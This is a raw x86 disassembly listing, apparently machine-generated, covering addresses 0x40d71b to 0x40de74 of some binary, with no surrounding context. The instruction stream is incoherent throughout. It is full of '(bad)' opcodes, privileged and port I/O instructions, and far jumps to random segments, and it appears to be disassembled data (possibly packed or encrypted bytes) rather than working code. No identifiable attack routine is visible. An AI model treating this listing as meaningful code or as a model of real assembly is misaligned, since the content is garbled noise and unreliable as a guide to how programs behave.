  40d71b:	add    DWORD PTR [ebx-0x14],ebx
  40d71e:	sbb    BYTE PTR [ecx],0x1a
  40d721:	dec    ebp
  40d722:	ret    0xf9e0
  40d725:	fisubr DWORD PTR [eax]
  40d727:	jno    0x40d77c
  40d729:	ins    DWORD PTR es:[edi],dx
  40d72a:	fstp   QWORD PTR [esi-0x68]
  40d72d:	xor    ah,cl
  40d72f:	scas   eax,DWORD PTR es:[edi]
  40d730:	clc    
  40d731:	sub    DWORD PTR [eax-0x1c62ac26],edx
  40d737:	jb     0x40d77a
  40d739:	push   ecx
  40d73a:	xor    esp,DWORD PTR [eax-0x3186513e]
  40d740:	test   eax,0xbe7260ee
  40d745:	mov    ch,0x3b
  40d747:	shl    BYTE PTR [esi+esi*4+0x4c],cl
  40d74b:	xlat   BYTE PTR ds:[ebx]
  40d74c:	jo     0x40d737
  40d74e:	mov    esp,0x71f2dc50
  40d753:	pop    esi
  40d754:	bound  ecx,QWORD PTR [esi+0x1332dc6]
  40d75a:	test   DWORD PTR [edx+edi*8],ebp
  40d75d:	push   0xffffffa2
  40d75f:	and    eax,0x38125236
  40d764:	rol    al,1
  40d766:	mov    si,0xc5e9
  40d76a:	mov    ah,0x36
  40d76c:	sbb    eax,0xf7184ec2
  40d771:	jnp    0x40d7cf
  40d773:	ret    
  40d774:	adc    esp,ecx
  40d776:	mov    esp,esi
  40d778:	gs es dec ecx
  40d77b:	inc    esi
  40d77c:	shr    ecx,cl
  40d77e:	push   0x44b7ae2
  40d783:	sbb    cl,ah
  40d785:	pop    edx
  40d786:	loopne 0x40d721
  40d788:	ins    DWORD PTR es:[edi],dx
  40d789:	sub    eax,DWORD PTR [ebx]
  40d78b:	jnp    0x40d717
  40d78d:	mov    edi,0xf284ad79
  40d792:	xchg   edi,eax
  40d793:	ror    DWORD PTR [ebx+0x1198bf49],1
  40d799:	cmp    esi,DWORD PTR [eax]
  40d79b:	aam    0xbd
  40d79d:	imul   esp,esp,0x86dd2938
  40d7a3:	in     eax,0xfc
  40d7a5:	jo     0x40d820
  40d7a7:	mov    eax,0x5f9ee215
  40d7ac:	(bad)  
  40d7ad:	xchg   ebp,eax
  40d7ae:	xor    eax,0xdbc13819
  40d7b3:	std    
  40d7b4:	or     BYTE PTR [edx],al
  40d7b6:	daa    
  40d7b7:	pop    ds
  40d7b8:	push   ebx
  40d7b9:	clc    
  40d7ba:	arpl   WORD PTR [edx],sp
  40d7bc:	cli    
  40d7bd:	mov    bh,0x88
  40d7bf:	mov    eax,ds:0x37296add
  40d7c4:	push   eax
  40d7c5:	sahf   
  40d7c6:	dec    ebx
  40d7c7:	inc    BYTE PTR [ebp+0x4d]
  40d7ca:	jns    0x40d7e6
  40d7cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7cd:	call   0xf30e5ff0
  40d7d2:	out    0xac,eax
  40d7d4:	or     ebp,0x65
  40d7d7:	inc    edx
  40d7d8:	sar    BYTE PTR [ebx],1
  40d7da:	adc    edi,0x1b
  40d7dd:	test   eax,0x155328ab
  40d7e2:	mov    ebx,fs
  40d7e4:	test   eax,0xd6c019dd
  40d7e9:	push   0xffffffe4
  40d7eb:	inc    ebp
  40d7ec:	les    eax,FWORD PTR [eax+0x5]
  40d7ef:	or     al,0x62
  40d7f1:	add    DWORD PTR [ecx+0x32],edi
  40d7f4:	dec    esp
  40d7f5:	shr    BYTE PTR [esi],0xa7
  40d7f8:	push   esp
  40d7f9:	fwait
  40d7fa:	retf   0x48d4
  40d7fd:	mov    cl,0xa5
  40d7ff:	add    DWORD PTR ds:0xfdfcf60e,0x6fd03ef9
  40d809:	add    al,0x6e
  40d80b:	xchg   edx,eax
  40d80c:	pop    ds
  40d80d:	popa   
  40d80e:	xor    ebx,DWORD PTR [ecx+0x19d121a1]
  40d814:	rcl    DWORD PTR [ebx+ebx*1-0x28],0x69
  40d819:	jp     0x40d7a5
  40d81b:	dec    ebx
  40d81c:	push   ebx
  40d81d:	push   edx
  40d81e:	sti    
  40d81f:	push   edx
  40d820:	xor    edx,DWORD PTR [esi+0x32]
  40d823:	xor    DWORD PTR [ecx+ebp*2-0x60],ebp
  40d827:	fnsave [eax+ecx*1]
  40d82a:	mul    DWORD PTR [ecx+ebx*8-0x59bb8681]
  40d831:	addr16 sbb al,0x2d
  40d834:	mov    ch,0xc9
  40d836:	mov    ecx,0xd10a8019
  40d83b:	cmp    DWORD PTR [esi],0xffffff8b
  40d83e:	stc    
  40d83f:	or     al,BYTE PTR [ebp+0x6e]
  40d842:	mov    bx,0x606
  40d846:	std    
  40d847:	arpl   WORD PTR [edi+0x38],si
  40d84a:	xor    ebp,DWORD PTR [ebx-0x68bbd554]
  40d850:	rcl    DWORD PTR [ebx-0x3],cl
  40d853:	and    esp,DWORD PTR [edi+eiz*8-0x3d97cde7]
  40d85a:	or     ax,0xb4ea
  40d85e:	pop    ds
  40d85f:	daa    
  40d860:	cmp    DWORD PTR [edx-0x1a],ebp
  40d863:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d864:	sub    DWORD PTR [ebx],esp
  40d866:	push   esp
  40d867:	jg     0x40d879
  40d869:	or     bh,BYTE PTR [ecx+0x58]
  40d86c:	jp     0x40d836
  40d86e:	push   dx
  40d870:	(bad)  
  40d871:	push   ds
  40d872:	add    eax,0x190fd3da
  40d877:	mov    ds:0x192fe698,al
  40d87c:	add    ecx,eax
  40d87e:	or     DWORD PTR [edx-0xc],esp
  40d881:	xor    ch,BYTE PTR [eax+0x666fc1dc]
  40d887:	les    esi,FWORD PTR [ecx+0x6f25e7b0]
  40d88d:	ja     0x40d8a6
  40d88f:	sbb    BYTE PTR [esi],bl
  40d891:	mov    al,ds:0x177f4077
  40d896:	jns    0x40d880
  40d898:	lods   eax,DWORD PTR ds:[esi]
  40d899:	shl    DWORD PTR [esi-0x70],cl
  40d89c:	sbb    BYTE PTR [ebx-0x473d060d],ah
  40d8a2:	jp     0x40d849
  40d8a4:	aam    0x34
  40d8a6:	xor    dh,dl
  40d8a8:	sbb    eax,0xc147117b
  40d8ad:	pop    edi
  40d8ae:	xchg   ecx,eax
  40d8af:	mov    DWORD PTR [eax+0x41],esi
  40d8b2:	dec    bp
  40d8b4:	pop    edx
  40d8b5:	stos   DWORD PTR es:[edi],eax
  40d8b6:	mov    dl,al
  40d8b8:	jecxz  0x40d913
  40d8ba:	stos   DWORD PTR es:[edi],eax
  40d8bb:	sbb    DWORD PTR [edi-0x64],ebp
  40d8be:	jbe    0x40d8e1
  40d8c0:	cmp    edx,DWORD PTR [ecx+0x32]
  40d8c3:	sub    eax,0xab56467
  40d8c8:	push   eax
  40d8c9:	ret    0x7051
  40d8cc:	pushf  
  40d8cd:	mov    cl,0x5b
  40d8cf:	adc    eax,0xc3666971
  40d8d4:	adc    esp,DWORD PTR [edx]
  40d8d6:	dec    eax
  40d8d7:	cmp    BYTE PTR [eax],bl
  40d8d9:	(bad)  
  40d8da:	jns    0x40d86e
  40d8dc:	mov    ebx,0xc9a09798
  40d8e1:	mov    ecx,0x69b5b89d
  40d8e6:	mov    ecx,0x314a77d9
  40d8eb:	mov    dh,0x14
  40d8ed:	fwait
  40d8ee:	jno    0x40d8d2
  40d8f0:	add    dl,BYTE PTR [bx+di-0x3a70]
  40d8f5:	loope  0x40d963
  40d8f7:	popf   
  40d8f8:	repz lock cwde 
  40d8fb:	mov    al,0x52
  40d8fd:	imul   edi,edx,0x161a1c5
  40d903:	inc    edi
  40d904:	xor    al,0x66
  40d907:	das    
  40d908:	enter  0xd453,0xec
  40d90c:	gs sub al,0xf3
  40d90f:	cmc    
  40d910:	(bad)  
  40d911:	and    eax,0x942c192d
  40d916:	ins    DWORD PTR es:[edi],dx
  40d917:	inc    edx
  40d918:	jg     0x40d8e9
  40d91a:	data16 xlat BYTE PTR ds:[ebx]
  40d91c:	lahf   
  40d91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d91e:	xlat   BYTE PTR ds:[ebx]
  40d91f:	push   ds
  40d920:	rcl    BYTE PTR [eax],1
  40d922:	rsm    
  40d924:	out    dx,eax
  40d925:	cmpps  xmm2,xmm6,0xb3
  40d929:	cmp    bl,BYTE PTR [ebp+0x49e9b669]
  40d92f:	fld    TBYTE PTR [ebp-0x36]
  40d932:	pop    ebp
  40d933:	clc    
  40d934:	pop    es
  40d935:	or     dl,0x32
  40d938:	or     BYTE PTR [ebx+0x29],ch
  40d93b:	popa   
  40d93c:	pop    esp
  40d93d:	sahf   
  40d93e:	ret    
  40d93f:	aad    0xa2
  40d941:	mov    ah,0x3d
  40d943:	jmp    0x72a9:0xd0256972
  40d94a:	jmp    0x40d90d
  40d94c:	retf   0x7548
  40d94f:	mov    WORD PTR [edx+0x3668ee9],?
  40d955:	in     eax,dx
  40d956:	sub    al,0xc
  40d958:	push   ebx
  40d959:	mov    edi,0x613bf56
  40d95e:	mov    dl,0x7e
  40d960:	scas   eax,DWORD PTR es:[edi]
  40d961:	imul   ecx,DWORD PTR [edi+edx*4+0xb],0xdaf8a31c
  40d969:	call   0x65ff:0x7e321667
  40d970:	test   al,0x1
  40d972:	mov    DWORD PTR [ebp+0x64],edi
  40d975:	imul   edx,DWORD PTR [edx+0x3b52d5a],0x79b8c793
  40d97f:	inc    ebx
  40d980:	push   eax
  40d981:	pop    ds
  40d982:	xor    eax,0xd98e1103
  40d987:	aam    0x26
  40d989:	iret   
  40d98a:	ret    
  40d98b:	mov    ebp,0x114102cb
  40d990:	mov    al,0xd8
  40d992:	jno    0x40d9c4
  40d994:	jp     0x40d93b
  40d996:	inc    ecx
  40d997:	xor    BYTE PTR [ebx],dh
  40d999:	pushf  
  40d99a:	aam    0xa4
  40d99c:	enter  0x9b18,0x82
  40d9a0:	sahf   
  40d9a1:	push   cs
  40d9a2:	mov    esi,DWORD PTR es:[ebx+0x415cf44c]
  40d9a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d9aa:	jns    0x40d998
  40d9ac:	test   eax,0x420724c8
  40d9b1:	xor    eax,DWORD PTR [esi-0x2a]
  40d9b4:	pop    es
  40d9b5:	jmp    0x2c14d188
  40d9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d9bb:	cmp    eax,0xd3790643
  40d9c0:	mov    dh,0x8b
  40d9c2:	push   cs
  40d9c3:	fldcw  WORD PTR [ebx]
  40d9c5:	hlt    
  40d9c6:	jecxz  0x40d9e1
  40d9c8:	add    bl,al
  40d9ca:	(bad)  
  40d9cb:	jnp    0x40d9a3
  40d9cd:	bound  ebx,QWORD PTR [ebx]
  40d9cf:	lods   al,BYTE PTR ds:[esi]
  40d9d0:	das    
  40d9d1:	fisub  DWORD PTR [esi-0x42]
  40d9d4:	sbb    dh,BYTE PTR [eax-0x50]
  40d9d7:	shr    BYTE PTR [esp+esi*1+0x13081993],cl
  40d9de:	lds    eax,FWORD PTR [eax-0x74d01dd1]
  40d9e4:	push   edx
  40d9e5:	push   ecx
  40d9e6:	inc    esp
  40d9e7:	dec    esi
  40d9e8:	cmp    ecx,DWORD PTR [eax-0xb]
  40d9eb:	pop    edi
  40d9ec:	xchg   ebx,eax
  40d9ed:	inc    ecx
  40d9ee:	mov    cl,0xaf
  40d9f0:	mov    ebp,0x103546b
  40d9f5:	pop    esi
  40d9f6:	fnstsw WORD PTR [ebx]
  40d9f8:	icebp  
  40d9f9:	mov    dh,0x6e
  40d9fb:	ret    0x33c6
  40d9fe:	sbb    dl,ch
  40da00:	jo     0x40da50
  40da02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da03:	inc    ebp
  40da04:	mov    dh,0x12
  40da06:	add    DWORD PTR ds:[edi-0x6c],esi
  40da0a:	mov    bh,0xd0
  40da0c:	dec    edx
  40da0d:	lods   eax,DWORD PTR ds:[esi]
  40da0e:	cwde   
  40da0f:	dec    edx
  40da10:	push   esi
  40da11:	mov    DWORD PTR [esi],ecx
  40da13:	xchg   ebp,eax
  40da14:	add    ch,BYTE PTR [eax]
  40da16:	jmp    0x40d9f1
  40da18:	fs xchg ecx,eax
  40da1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da1b:	xor    ebp,esp
  40da1d:	data16 stc 
  40da1f:	push   ebx
  40da20:	jmp    0xb3a5:0x329c928d
  40da27:	sbb    DWORD PTR [ecx+0x341a76a2],edx
  40da2d:	es mov esi,0x74ac531f
  40da33:	cmc    
  40da34:	mov    ds:0x5290cb83,eax
  40da39:	imul   eax,DWORD PTR [eax+edi*8],0x1652d1cf
  40da40:	fidivr WORD PTR [eax+0x62]
  40da43:	push   es
  40da44:	jb     0x40da6b
  40da46:	push   ds
  40da47:	sub    DWORD PTR [ebx],edx
  40da49:	fwait
  40da4a:	jecxz  0x40da03
  40da4c:	shr    DWORD PTR [edx+0x2e],cl
  40da4f:	int    0xe5
  40da51:	jecxz  0x40d9f9
  40da53:	xchg   ebp,eax
  40da54:	jl     0x40da23
  40da56:	arpl   di,sp
  40da58:	sbb    DWORD PTR [eax+0x6a49ac70],esp
  40da5e:	xchg   DWORD PTR [ebx-0x71b6992e],edi
  40da64:	push   ebx
  40da65:	inc    esp
  40da66:	push   ebp
  40da67:	imul   edx,DWORD PTR [ebp-0x3d],0xffffffe6
  40da6b:	mov    ds:0xecfd6afa,eax
  40da70:	mov    al,0x40
  40da72:	xchg   esi,eax
  40da73:	scas   al,BYTE PTR es:[edi]
  40da74:	and    ebx,DWORD PTR [edx-0x7cac32a4]
  40da7a:	push   es
  40da7b:	fs mov ecx,0xf6f28abd
  40da81:	add    DWORD PTR [edx-0x7c6b9dbd],esp
  40da87:	(bad)  [ecx-0x49]
  40da8a:	cwde   
  40da8b:	enter  0xe553,0x87
  40da8f:	push   edx
  40da90:	pop    ss
  40da91:	pop    ds
  40da92:	jecxz  0x40da64
  40da94:	imul   BYTE PTR [edx+0x48]
  40da97:	retf   
  40da98:	fwait
  40da99:	xor    edi,ecx
  40da9b:	pop    ecx
  40da9c:	jne    0x40da69
  40da9e:	add    BYTE PTR [edi-0x6e],cl
  40daa1:	jb     0x40db1c
  40daa3:	jae    0x40da86
  40daa5:	add    eax,DWORD PTR [esi-0x41e05601]
  40daab:	sti    
  40daac:	push   esi
  40daad:	cmp    esp,esi
  40daaf:	sub    DWORD PTR [eax],esp
  40dab1:	xlat   BYTE PTR ds:[ebx]
  40dab2:	aad    0xc8
  40dab4:	push   ebx
  40dab5:	mov    edi,0x167a5d1d
  40daba:	or     DWORD PTR ds:0x7ef1695a,0x9917b56
  40dac4:	std    
  40dac5:	cmp    BYTE PTR [eax],al
  40dac7:	and    DWORD PTR [ebx],ecx
  40dac9:	push   edi
  40daca:	jno    0x40dafb
  40dacc:	sbb    BYTE PTR [esi+0x1fd78c29],ah
  40dad2:	rcr    BYTE PTR [ecx],1
  40dad4:	cmp    DWORD PTR [esi+edi*2-0x1],esi
  40dad8:	cli    
  40dad9:	mov    dh,0xd7
  40dadb:	inc    edx
  40dadc:	push   ebx
  40dadd:	adc    DWORD PTR [edi+esi*2-0x2bd33eba],esi
  40dae4:	mov    esi,0xc7c1266a
  40dae9:	or     al,0xd7
  40daeb:	adc    ah,ch
  40daed:	pop    esp
  40daee:	data16 sti 
  40daf0:	fidivr WORD PTR [eax-0x7ce5fa33]
  40daf6:	hlt    
  40daf7:	sbb    DWORD PTR [eax-0x5a],ebx
  40dafa:	inc    ecx
  40dafb:	idiv   ebx
  40dafd:	nop
  40dafe:	pop    ecx
  40daff:	int    0x53
  40db01:	rcr    BYTE PTR [eax],cl
  40db03:	std    
  40db04:	and    BYTE PTR [ebp+ebx*1-0x628e3b8e],al
  40db0b:	push   edi
  40db0c:	loop   0x40db15
  40db0e:	fcomp  st(7)
  40db10:	pop    es
  40db11:	xchg   BYTE PTR ds:0x9081e33a,ch
  40db17:	fs push ebx
  40db19:	push   cs
  40db1a:	cmp    esi,DWORD PTR [esi+0x7038dd73]
  40db20:	(bad)
  40db24:	push   ds
  40db25:	and    edi,DWORD PTR ds:0x62939225
  40db2b:	mov    edi,0x8274c29c
  40db30:	adc    eax,ecx
  40db32:	mov    eax,ds:0x769774d
  40db37:	add    BYTE PTR [eax-0x3a9fbda0],ch
  40db3d:	push   0x2d612f0a
  40db42:	out    0x9d,al
  40db44:	jb     0x40db50
  40db46:	xor    bh,bl
  40db48:	inc    edi
  40db49:	shl    BYTE PTR [edx+0x31],cl
  40db4c:	or     BYTE PTR [esi],ah
  40db4e:	out    0x70,al
  40db50:	daa    
  40db51:	push   ss
  40db52:	xchg   edx,eax
  40db53:	dec    esp
  40db54:	in     eax,0x8f
  40db56:	jns    0x40db8d
  40db58:	xabort 0x8f
  40db5b:	stos   DWORD PTR es:[edi],eax
  40db5c:	adc    eax,0x6aa8213e
  40db61:	test   edx,edi
  40db63:	xor    al,0xd3
  40db65:	mov    eax,ds:0x71c10ced
  40db6a:	jns    0x40db68
  40db6c:	xchg   ecx,eax
  40db6d:	cmp    BYTE PTR [ebx-0xb8087b6],bh
  40db73:	sbb    ebx,edi
  40db75:	icebp  
  40db76:	mov    eax,ds:0x84896601
  40db7b:	ficom  WORD PTR [ebx+0x40]
  40db7e:	dec    esp
  40db7f:	in     al,dx
  40db80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db81:	das    
  40db82:	bound  esp,QWORD PTR [ebx+edx*8]
  40db85:	push   0x41
  40db87:	mov    ch,0x30
  40db89:	cmp    ecx,DWORD PTR [esi]
  40db8b:	dec    edx
  40db8c:	xchg   ebp,eax
  40db8d:	lods   eax,DWORD PTR ds:[esi]
  40db8e:	jns    0x40db52
  40db90:	or     ebx,ebx
  40db92:	mov    ecx,0xb0a6ee07
  40db97:	sbb    ecx,eax
  40db99:	adc    DWORD PTR [edi],esp
  40db9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db9c:	sbb    al,0xc3
  40db9e:	shr    BYTE PTR [ebx+edx*2],cl
  40dba1:	ins    DWORD PTR es:[edi],dx
  40dba2:	cmp    cl,BYTE PTR [edx-0x39]
  40dba5:	aam    0xe0
  40dba7:	push   edi
  40dba8:	mov    gs,WORD PTR [ebx+0xa]
  40dbab:	mov    esp,ss
  40dbad:	stos   BYTE PTR es:[edi],al
  40dbae:	adc    al,0x47
  40dbb0:	adc    BYTE PTR [edx+0x59],dh
  40dbb3:	mov    BYTE PTR [eax+eiz*4+0x7757c92e],ah
  40dbba:	in     eax,dx
  40dbbb:	repnz push esp
  40dbbd:	ror    DWORD PTR [ecx+0x3b],0xe
  40dbc1:	inc    esp
  40dbc2:	sbb    ebx,esi
  40dbc4:	xor    al,0x6a
  40dbc6:	push   edi
  40dbc7:	push   edx
  40dbc8:	mov    eax,0xf7b5570b
  40dbcd:	shl    DWORD PTR [esi+0x6c],0x3a
  40dbd1:	inc    ecx
  40dbd2:	and    esp,DWORD PTR [ebp-0x3d]
  40dbd5:	aam    0x41
  40dbd7:	sbb    BYTE PTR [ebx+0x7c7201be],dl
  40dbdd:	scas   eax,DWORD PTR es:[edi]
  40dbde:	push   0xffffffb4
  40dbe0:	retf   
  40dbe1:	mov    gs,WORD PTR [ebx-0x3070ac5b]
  40dbe7:	ret    
  40dbe8:	pop    ds
  40dbe9:	pop    ss
  40dbea:	mov    ah,0x89
  40dbec:	xor    ebp,DWORD PTR [ebx-0xc]
  40dbef:	imul   esp,edx,0x440a4df9
  40dbf5:	mov    bl,0xd
  40dbf7:	dec    esp
  40dbf8:	lods   eax,DWORD PTR ds:[esi]
  40dbf9:	and    al,0xa6
  40dbfb:	(bad)  
  40dbfc:	lods   al,BYTE PTR ds:[esi]
  40dbfd:	je     0x40dbfb
  40dbff:	enter  0x6a82,0x8d
  40dc03:	stos   BYTE PTR es:[edi],al
  40dc04:	ss push ebx
  40dc06:	arpl   bp,bx
  40dc08:	fimul  DWORD PTR [edx-0x34]
  40dc0b:	push   bx
  40dc0d:	cld    
  40dc0e:	dec    eax
  40dc0f:	pop    eax
  40dc10:	popf   
  40dc11:	loope  0x40dc75
  40dc13:	in     eax,0xbd
  40dc15:	push   0x34
  40dc17:	or     DWORD PTR [ecx-0x2e3b9b8],ecx
  40dc1d:	push   ebp
  40dc1e:	dec    di
  40dc20:	sbb    ebx,DWORD PTR [esi+eax*1-0x6e363cdf]
  40dc27:	sbb    DWORD PTR [ecx],esi
  40dc29:	retf   
  40dc2a:	out    dx,al
  40dc2b:	aam    0x2f
  40dc2d:	das    
  40dc2e:	push   esp
  40dc2f:	mov    ds:0x1efef253,eax
  40dc34:	pop    ss
  40dc35:	xchg   cl,dl
  40dc37:	cmc    
  40dc38:	push   ds
  40dc39:	imul   esi,DWORD PTR ds:0xb672c152,0xffffff86
  40dc40:	mov    bl,0x7e
  40dc42:	aad    0x61
  40dc44:	push   ebx
  40dc45:	jg     0x40dc9d
  40dc47:	push   0x84718555
  40dc4c:	std    
  40dc4d:	push   0xffffffa1
  40dc4f:	and    DWORD PTR [edx-0x31],ebp
  40dc52:	pop    ebp
  40dc53:	and    al,0xee
  40dc55:	rcl    DWORD PTR [edx+0x6e],0x53
  40dc59:	daa    
  40dc5a:	dec    esi
  40dc5b:	scas   eax,DWORD PTR es:[edi]
  40dc5c:	das    
  40dc5d:	lods   al,BYTE PTR ds:[esi]
  40dc5e:	test   ebp,0x12006ac7
  40dc64:	fmul   st,st(4)
  40dc66:	mov    ebp,0x797e60d9
  40dc6b:	cmp    al,0x97
  40dc6d:	xchg   BYTE PTR [ebx+0x16eb77f7],ch
  40dc73:	sbb    ecx,DWORD PTR [edi-0x5bedb42c]
  40dc79:	push   eax
  40dc7a:	inc    ecx
  40dc7b:	inc    edx
  40dc7c:	push   ebx
  40dc7d:	push   es
  40dc7e:	sbb    BYTE PTR [ebx+0x2f3f4475],dh
  40dc84:	mov    es,WORD PTR [eax]
  40dc86:	das    
  40dc87:	popf   
  40dc88:	outs   dx,DWORD PTR ds:[esi]
  40dc89:	add    eax,0x70e0a9d6
  40dc8e:	inc    ebx
  40dc8f:	cmp    BYTE PTR [ebx+0x28],dl
  40dc92:	mov    ?,edx
  40dc94:	jmp    0xde6a:0x450a44bc
  40dc9b:	loope  0x40dc35
  40dc9d:	cmp    eax,0xa3481288
  40dca2:	clc    
  40dca3:	addr16 mov ah,dl
  40dca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dca7:	cdq    
  40dca8:	add    dl,al
  40dcaa:	add    al,BYTE PTR [esi+edi*4-0x6e]
  40dcae:	into   
  40dcaf:	sbb    DWORD PTR [eax+eax*1],ebx
  40dcb2:	fcomi  st,st(7)
  40dcb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcb5:	jbe    0x40dc37
  40dcb7:	mov    edx,0xea7a9d53
  40dcbc:	jle    0x40dd12
  40dcbe:	push   edi
  40dcbf:	push   ebx
  40dcc0:	mov    al,0x69
  40dcc2:	(bad)  
  40dcc3:	in     eax,0x54
  40dcc5:	clc    
  40dcc6:	mov    ebp,0x70aa075c
  40dccb:	ins    BYTE PTR es:[edi],dx
  40dccc:	mov    esp,fs
  40dcce:	int    0x4
  40dcd0:	jae    0x40dc8a
  40dcd2:	push   ebx
  40dcd3:	sahf   
  40dcd4:	pop    eax
  40dcd5:	icebp  
  40dcd6:	inc    ecx
  40dcd7:	(bad)  
  40dcd8:	inc    edi
  40dcd9:	dec    edi
  40dcda:	xor    eax,0x59015e44
  40dcdf:	jbe    0x40dc97
  40dce1:	std    
  40dce2:	inc    esi
  40dce3:	mov    bl,0x53
  40dce5:	xchg   esp,eax
  40dce6:	je     0x40dd56
  40dce8:	std    
  40dce9:	mov    ecx,0x6acf18b9
  40dcee:	(bad)  [edx+0x2c]
  40dcf1:	mov    eax,0x934357
  40dcf6:	popa   
  40dcf7:	push   0x3e84c953
  40dcfc:	nop
  40dcfd:	cmp    DWORD PTR [ebp+ecx*1-0x70f809a],edx
  40dd04:	scas   eax,DWORD PTR es:[edi]
  40dd05:	imul   ebp,edi,0x5df5b2bf
  40dd0b:	jnp    0x40dd60
  40dd0d:	daa    
  40dd0e:	cmp    al,0x5c
  40dd10:	sub    DWORD PTR [esi+0x63],ebp
  40dd13:	mov    gs,WORD PTR [ebx]
  40dd15:	imul   eax,DWORD PTR [esi],0xffffffc3
  40dd18:	adc    BYTE PTR [ebp-0x69],dh
  40dd1b:	mov    DWORD PTR [eax+eiz*8-0x15],edx
  40dd1f:	or     al,0x53
  40dd21:	sbb    DWORD PTR [ebx-0x504a8721],ecx
  40dd27:	xchg   edi,eax
  40dd28:	out    0x1,al
  40dd2a:	int    0xee
  40dd2c:	adc    BYTE PTR [eax+0x7e],ch
  40dd2f:	sti    
  40dd30:	ins    DWORD PTR es:[edi],dx
  40dd31:	stos   BYTE PTR es:[edi],al
  40dd32:	(bad)  
  40dd33:	retf   
  40dd34:	inc    edi
  40dd35:	push   ebp
  40dd36:	outs   dx,WORD PTR ds:[esi]
  40dd38:	mov    al,0x8c
  40dd3a:	pop    eax
  40dd3b:	add    dh,BYTE PTR [ebp+0x2a03ee4a]
  40dd41:	imul   ebx,DWORD PTR [ecx+ebp*8],0x60
  40dd45:	sbb    eax,0xc6fd2fa
  40dd4a:	in     eax,dx
  40dd4b:	push   ss
  40dd4c:	rcr    ah,0x66
  40dd4f:	add    bl,cl
  40dd51:	and    al,0xb7
  40dd53:	fwait
  40dd54:	fwait
  40dd55:	arpl   WORD PTR [edx],dx
  40dd57:	call   0xb04c:0x1ae06b3
  40dd5e:	in     al,dx
  40dd5f:	pop    ecx
  40dd60:	sar    edi,1
  40dd62:	repz sti 
  40dd64:	push   ebx
  40dd65:	push   esp
  40dd66:	ret    
  40dd67:	ss mov ecx,0x79a3aa15
  40dd6d:	add    al,0xa8
  40dd6f:	sbb    eax,0x7a73d9eb
  40dd74:	add    ecx,DWORD PTR [edi+0xf534eca]
  40dd7a:	sub    DWORD PTR [ecx+eax*2],ebp
  40dd7d:	xchg   esp,eax
  40dd7e:	sub    edx,eax
  40dd80:	test   BYTE PTR [ebx+0x78],ch
  40dd83:	data16 loop 0x40ddf1
  40dd86:	xor    al,0xd7
  40dd88:	nop
  40dd89:	outs   dx,BYTE PTR ds:[esi]
  40dd8b:	test   bl,ch
  40dd8d:	adc    DWORD PTR [esi+0x9],esp
  40dd90:	mov    cl,0x81
  40dd92:	or     esi,DWORD PTR [edx]
  40dd94:	ss push es
  40dd96:	jecxz  0x40dd9d
  40dd98:	imul   edi,DWORD PTR cs:[ecx-0xecd5fc],0x36
  40dda0:	mov    WORD PTR [edi],?
  40dda2:	das    
  40dda3:	push   edx
  40dda4:	jg     0x40de0f
  40dda6:	int3   
  40dda7:	xor    ah,bl
  40dda9:	lods   eax,DWORD PTR ds:[esi]
  40ddaa:	jge    0x40ddff
  40ddac:	fisttp QWORD PTR [edi+0x43]
  40ddaf:	retf   
  40ddb0:	out    0x8,eax
  40ddb2:	cmp    bl,BYTE PTR [ecx-0x4d]
  40ddb5:	test   BYTE PTR [edi],al
  40ddb7:	inc    esp
  40ddb8:	or     DWORD PTR [edx-0x68c8d6c8],0x15651766
  40ddc2:	jle    0x40de21
  40ddc4:	loopne 0x40dd8c
  40ddc6:	or     BYTE PTR [ecx],bl
  40ddc8:	dec    edi
  40ddc9:	fdiv   QWORD PTR [edi-0x5c]
  40ddcc:	mov    cl,0x6b
  40ddce:	es es mov dl,ah
  40ddd2:	call   0xc2a9:0xedf5ac99
  40ddd9:	sub    DWORD PTR [esi+0x1e],ebp
  40dddc:	cmp    eax,0x9119303a
  40dde1:	icebp  
  40dde2:	mov    al,0xe7
  40dde4:	aaa    
  40dde5:	dec    ecx
  40dde6:	retf   0x53b6
  40dde9:	adc    esi,DWORD PTR [ebx]
  40ddeb:	mov    esp,0xcebdffb0
  40ddf0:	adc    eax,0xeaae876b
  40ddf5:	inc    eax
  40ddf6:	xchg   BYTE PTR [ebp+0x29],bl
  40ddf9:	push   ecx
  40ddfa:	mov    ax,ds:0x54f098c5
  40de00:	(bad)  
  40de01:	(bad)  ds:0xf6a48719
  40de07:	jle    0x40de29
  40de09:	fild   WORD PTR [eax]
  40de0b:	xchg   ecx,eax
  40de0c:	push   ebx
  40de0d:	test   eax,0x5a9d6eb8
  40de12:	popa   
  40de13:	aad    0xdc
  40de15:	push   0xfffffff5
  40de17:	dec    edi
  40de18:	push   eax
  40de19:	inc    edi
  40de1a:	daa    
  40de1b:	dec    esi
  40de1c:	xor    eax,0x44cc66fd
  40de21:	xor    eax,0x7f7fc310
  40de26:	call   0xbde5:0x973ae119
  40de2d:	pop    edx
  40de2e:	mov    WORD PTR [edi],ss
  40de30:	push   ebx
  40de31:	lods   al,BYTE PTR ds:[esi]
  40de32:	(bad)  
  40de34:	popf   
  40de35:	and    ebp,DWORD PTR [eax+0x2d6983b6]
  40de3b:	test   ebp,esp
  40de3d:	or     BYTE PTR [ebx+edx*2+0x47],dh
  40de41:	and    BYTE PTR [esi+0x44],0x13
  40de45:	loopne 0x40de5e
  40de47:	and    DWORD PTR [edx+0xa1b107d],edx
  40de4d:	loope  0x40de26
  40de4f:	mov    edx,0xad1ddfcb
  40de54:	inc    ecx
  40de55:	(bad)  
  40de56:	xchg   si,ax
  40de58:	adc    al,0xca
  40de5a:	jmp    0xf44b882e
  40de5f:	sbb    ecx,esi
  40de61:	jg     0x40de2a
  40de63:	mov    cl,0xfa
  40de65:	cmp    esp,DWORD PTR [edx]
  40de67:	sub    DWORD PTR [ebx-0x4b],edx
  40de6a:	test   DWORD PTR [edx-0xe],edx
  40de6d:	mov    dl,0x9f
  40de6f:	jmp    0x6f947c6
  40de74:	fbstp  TBYTE PTR [edx+0x4a]
